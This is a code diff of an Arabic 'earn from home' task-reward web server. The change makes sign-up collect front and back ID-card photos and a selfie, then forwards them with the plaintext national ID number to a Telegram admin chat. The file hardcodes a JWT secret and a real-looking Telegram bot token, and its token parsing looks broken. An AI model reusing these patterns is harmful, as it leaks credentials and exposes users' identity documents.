@@ -13,12 +13,11 @@ const app = express();
 const port = process.env.PORT || 8080;
 const JWT_SECRET = process.env.JWT_SECRET || 'arbah-min-baytak-secret-key-2026';
 
-// بيانات البوت وتليجرام مدمجة مباشرة
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8828476778:AAE338K555Ys-UhT_Qra0z-BiL3405DGoSE';
 const TELEGRAM_ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '7401854621';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// الاتصال بقاعدة بيانات Upstash Redis
+// إعداد الاتصال بـ Upstash
 let redis;
 if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) {
   redis = new Redis({
@@ -26,7 +25,6 @@ if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) 
     token: process.env.UPSTASH_REDIS_REST_TOKEN,
   });
 } else {
-  console.warn('تنبيه: لم يتم العثور على متغيرات Upstash، يتم استخدام الذاكرة المؤقتة مؤقتاً.');
   const memoryStore = new Map();
   const setStore = new Map();
   redis = {
@@ -74,27 +72,22 @@ if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) 
   };
 }
 
-// استقبال الصور في الذاكرة لتمريرها لتليجرام
 const upload = multer({
   storage: multer.memoryStorage(),
-  limits: { fileSize: 5 * 1024 * 1024 },
+  limits: { fileSize: 6 * 1024 * 1024 },
 });
 
 app.use(express.json());
-
-// مسارات ملفات الواجهة الأمامية من المجلد الرئيسي
 app.use(express.static(path.join(__dirname, '.')));
 
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// تشفير الرقم الوطني
 function hashNationalId(id) {
   return crypto.createHash('sha256').update(id.trim()).digest('hex');
 }
 
-// وسيط التحقق من تسجيل الدخول
 async function authenticateToken(req, res, next) {
   const authHeader = req.headers['authorization'];
   const token = authHeader && authHeader.split(' ');
@@ -107,7 +100,6 @@ async function authenticateToken(req, res, next) {
   });
 }
 
-// تهيئة المهام التجريبية
 async function initSampleTasks() {
   try {
     const taskCount = await redis.scard('active_task_ids');
@@ -127,20 +119,12 @@ async function initSampleTasks() {
           reward: 5000,
           proof_type: 'screenshot',
         },
-        {
-          id: 'task_3',
-          title: 'مشاركة رابط الموقع على فيسبوك',
-          description: 'انشر رابط الموقع في مجموعة وضع رابط المنشور كإثبات.',
-          reward: 4000,
-          proof_type: 'text_url',
-        },
       ];
 
       for (const t of sampleTasks) {
         await redis.hset(`task:${t.id}`, t);
         await redis.sadd('active_task_ids', t.id);
       }
-      console.log('✅ تم إعداد المهام المبدئية بنجاح.');
     }
   } catch (err) {
     console.error('Task init error:', err);
@@ -148,21 +132,24 @@ async function initSampleTasks() {
 }
 initSampleTasks();
 
-// --- 1. تسجيل مستخدم جديد ورفع الهوية ---
-app.post('/api/register', upload.fields([{ name: 'id_card', maxCount: 1 }, { name: 'selfie', maxCount: 1 }]), async (req, res) => {
+// --- 1. تسجيل مستخدم جديد ورفع (أمامية + خلفية + سيلفي) ---
+app.post('/api/register', upload.fields([
+  { name: 'id_front', maxCount: 1 },
+  { name: 'id_back', maxCount: 1 },
+  { name: 'selfie', maxCount: 1 }
+]), async (req, res) => {
   try {
     const { username, phone, national_id, password } = req.body;
 
     if (!username || !phone || !national_id || !password) {
       return res.status(400).json({ error: 'جميع الحقول مطلوبة.' });
     }
-    if (!req.files || !req.files['id_card'] || !req.files['selfie']) {
-      return res.status(400).json({ error: 'يرجى إرفاق صورة الهوية وصورة السيلفي للمطابقة.' });
+    if (!req.files || !req.files['id_front'] || !req.files['id_back'] || !req.files['selfie']) {
+      return res.status(400).json({ error: 'يرجى إرفاق: صورة الهوية الأمامية، والخلفية، وصورة السيلفي.' });
     }
 
     const nationalIdHash = hashNationalId(national_id);
 
-    // فحص منع التكرار
     const isIdTaken = await redis.sismember('registered_national_ids', nationalIdHash);
     if (isIdTaken) {
       return res.status(400).json({ error: 'عذراً، هذا الرقم الوطني مسجل مسبقاً في النظام لمنع تكرار الحسابات.' });
@@ -170,7 +157,7 @@ app.post('/api/register', upload.fields([{ name: 'id_card', maxCount: 1 }, { nam
 
     const isPhoneTaken = await redis.hexists('users_by_phone', phone.trim());
     if (isPhoneTaken) {
-      return res.status(400).json({ error: 'رقم الهاتف مستخدم مسبقاً.' });
+      return res.status(400).json({ error: 'رقم الهاتف مستخدم لحساب آخر.' });
     }
 
     const userId = crypto.randomUUID();
@@ -190,19 +177,20 @@ app.post('/api/register', upload.fields([{ name: 'id_card', maxCount: 1 }, { nam
     await redis.sadd('registered_national_ids', nationalIdHash);
     await redis.hset('users_by_phone', { [phone.trim()]: userId });
 
-    // إرسال صورة الهوية إلى تليجرام
-    const caption = `📋 *طلب تحقق جديد - موقع أربح من بيتك*\n\n` +
-                    `👤 *المستخدم:* ${username}\n` +
-                    `📱 *الهاتف:* ${phone}\n` +
-                    `🆔 *معرف الحساب:* \`${userId}\`\n\n` +
-                    `يرجى التدقيق والموافقة أو الرفض:`;
+    // إرسال الصورة 1: واجهة الهوية الأمامية مع أزرار القبول والرفض
+    const frontCaption = `📋 *طلب تحقق من هوية جديد - أربح من بيتك*\n\n` +
+                         `👤 *الاسم:* ${username}\n` +
+                         `📱 *الهاتف:* ${phone}\n` +
+                         `🆔 *الرقم الوطني:* ${national_id}\n` +
+                         `🔑 *معرف الحساب:* \`${userId}\`\n\n` +
+                         `1️⃣ *صورة الهوية (الوجه الأمامي):*`;
 
-    const form = new FormData();
-    form.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
-    form.append('caption', caption);
-    form.append('parse_mode', 'Markdown');
-    form.append('photo', req.files['id_card'][0].buffer, { filename: 'id_card.jpg' });
-    form.append('reply_markup', JSON.stringify({
+    const formFront = new FormData();
+    formFront.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+    formFront.append('caption', frontCaption);
+    formFront.append('parse_mode', 'Markdown');
+    formFront.append('photo', req.files['id_front'][0].buffer, { filename: 'id_front.jpg' });
+    formFront.append('reply_markup', JSON.stringify({
       inline_keyboard: [
         [
           { text: '✅ قبول وتفعيل الحساب', callback_data: `approve_user:${userId}` },
@@ -211,27 +199,35 @@ app.post('/api/register', upload.fields([{ name: 'id_card', maxCount: 1 }, { nam
       ]
     }));
 
-    await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
+    await axios.post(`${TELEGRAM_API}/sendPhoto`, formFront, { headers: formFront.getHeaders() });
 
-    // إرسال صورة السيلفي للمطابقة
-    const selfieForm = new FormData();
-    selfieForm.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
-    selfieForm.append('caption', `🤳 *صورة السيلفي للمطابقة للمستخدم:* ${username}`);
-    selfieForm.append('photo', req.files['selfie'][0].buffer, { filename: 'selfie.jpg' });
+    // إرسال الصورة 2: الوجه الخلفي للهوية
+    const formBack = new FormData();
+    formBack.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+    formBack.append('caption', `2️⃣ *صورة الهوية (الوجه الخلفي) للمستخدم:* ${username}`);
+    formBack.append('parse_mode', 'Markdown');
+    formBack.append('photo', req.files['id_back'][0].buffer, { filename: 'id_back.jpg' });
+    await axios.post(`${TELEGRAM_API}/sendPhoto`, formBack, { headers: formBack.getHeaders() });
 
-    await axios.post(`${TELEGRAM_API}/sendPhoto`, selfieForm, { headers: selfieForm.getHeaders() });
+    // إرسال الصورة 3: السيلفي
+    const formSelfie = new FormData();
+    formSelfie.append('chat_id', TELEGRAM_ADMIN_CHAT_ID);
+    formSelfie.append('caption', `3️⃣ *صورة السيلفي للمطابقة للمستخدم:* ${username}`);
+    formSelfie.append('parse_mode', 'Markdown');
+    formSelfie.append('photo', req.files['selfie'][0].buffer, { filename: 'selfie.jpg' });
+    await axios.post(`${TELEGRAM_API}/sendPhoto`, formSelfie, { headers: formSelfie.getHeaders() });
 
     res.json({
       success: true,
       message: 'تم إرسال طلبك وصور الهوية بنجاح! حسابك قيد المراجعة وسيتم تفعيله من الإدارة قريباً.',
     });
   } catch (err) {
-    console.error('Registration Error:', err);
-    res.status(500).json({ error: 'حدث خطأ في الخادم أثناء إرسال البيانات.' });
+    console.error('Telegram/Registration Error:', err.response?.data || err.message);
+    res.status(500).json({ error: 'تعذر إرسال البيانات إلى تليجرام، تأكد من إرسال /start للبوت أولاً.' });
   }
 });
 
-// --- 2. تسجيل الدخول ---
+// باقي المسارات
 app.post('/api/login', async (req, res) => {
   try {
     const { phone, password } = req.body;
@@ -259,7 +255,6 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// --- 3. جلب بيانات الحساب ---
 app.get('/api/me', authenticateToken, async (req, res) => {
   try {
     const user = await redis.hgetall(`user:${req.user.id}`);
@@ -269,7 +264,6 @@ app.get('/api/me', authenticateToken, async (req, res) => {
   }
 });
 
-// --- 4. جلب المهام ---
 app.get('/api/tasks', authenticateToken, async (req, res) => {
   try {
     const taskIds = await redis.smembers('active_task_ids');
@@ -284,7 +278,6 @@ app.get('/api/tasks', authenticateToken, async (req, res) => {
   }
 });
 
-// --- 5. إرسال إثبات تنفيذ مهمة ---
 app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screenshot'), async (req, res) => {
   try {
     const { taskId } = req.params;
@@ -340,30 +333,22 @@ app.post('/api/tasks/:taskId/submit', authenticateToken, upload.single('screensh
 
     res.json({ success: true, message: 'تم إرسال إثبات المهمة للمراجعة بنجاح!' });
   } catch (err) {
-    console.error(err);
     res.status(500).json({ error: 'خطأ أثناء إرسال إثبات المهمة' });
   }
 });
 
-// --- 6. طلب سحب الرصيد ---
 app.post('/api/withdraw', authenticateToken, async (req, res) => {
   try {
     const { amount, method, destination } = req.body;
     const withdrawAmount = parseInt(amount);
 
-    if (!withdrawAmount || withdrawAmount <= 0) {
-      return res.status(400).json({ error: 'يرجى إدخال مبلغ صحيح' });
-    }
-    if (!method || !destination) {
-      return res.status(400).json({ error: 'يرجى تحديد طريقة السحب ورقم الحساب/المحفظة' });
-    }
+    if (!withdrawAmount || withdrawAmount <= 0) return res.status(400).json({ error: 'يرجى إدخال مبلغ صحيح' });
+    if (!method || !destination) return res.status(400).json({ error: 'يرجى تحديد طريقة السحب ورقم الحساب/المحفظة' });
 
     const user = await redis.hgetall(`user:${req.user.id}`);
     const currentBalance = parseInt(user.balance || 0);
 
-    if (currentBalance < withdrawAmount) {
-      return res.status(400).json({ error: 'رصيدك الحالي غير كافٍ لإتمام السحب' });
-    }
+    if (currentBalance < withdrawAmount) return res.status(400).json({ error: 'رصيدك الحالي غير كافٍ لإتمام السحب' });
 
     await redis.hincrby(`user:${req.user.id}`, 'balance', -withdrawAmount);
 
@@ -404,7 +389,7 @@ app.post('/api/withdraw', authenticateToken, async (req, res) => {
   }
 });
 
-// --- 7. معالجة تفاعلات البوت في تليجرام (Webhook) ---
+// استقبال قرارات أزرار تليجرام
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
@@ -421,9 +406,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           parse_mode: 'Markdown',
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم تفعيل الحساب' });
-      }
-
-      else if (action === 'reject_user') {
+      } else if (action === 'reject_user') {
         const u = await redis.hgetall(`user:${targetId}`);
         await redis.hset(`user:${targetId}`, { status: 'rejected' });
         if (u && u.national_id_hash) {
@@ -436,9 +419,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           parse_mode: 'Markdown',
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم الرفض' });
-      }
-
-      else if (action === 'approve_sub') {
+      } else if (action === 'approve_sub') {
         const sub = await redis.hgetall(`submission:${targetId}`);
         if (sub && sub.status === 'pending') {
           await redis.hset(`submission:${targetId}`, { status: 'approved' });
@@ -449,27 +430,21 @@ app.post('/api/telegram-webhook', async (req, res) => {
           });
         }
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم قبول الإثبات' });
-      }
-
-      else if (action === 'reject_sub') {
+      } else if (action === 'reject_sub') {
         await redis.hset(`submission:${targetId}`, { status: 'rejected' });
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
           chat_id: cb.message.chat.id,
           text: `🔴 تم رفض إثبات هذه المهمة.`,
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم رفض الإثبات' });
-      }
-
-      else if (action === 'pay_with') {
+      } else if (action === 'pay_with') {
         await redis.hset(`withdrawal:${targetId}`, { status: 'paid' });
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
           chat_id: cb.message.chat.id,
           text: `✅ تم تأكيد إرسال الحوالة للمستخدم.`,
         });
         await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: cb.id, text: 'تم تأكيد الدفع' });
-      }
-
-      else if (action === 'reject_with') {
+      } else if (action === 'reject_with') {
         const w = await redis.hgetall(`withdrawal:${targetId}`);
         if (w && w.status === 'pending') {
           await redis.hset(`withdrawal:${targetId}`, { status: 'rejected' });
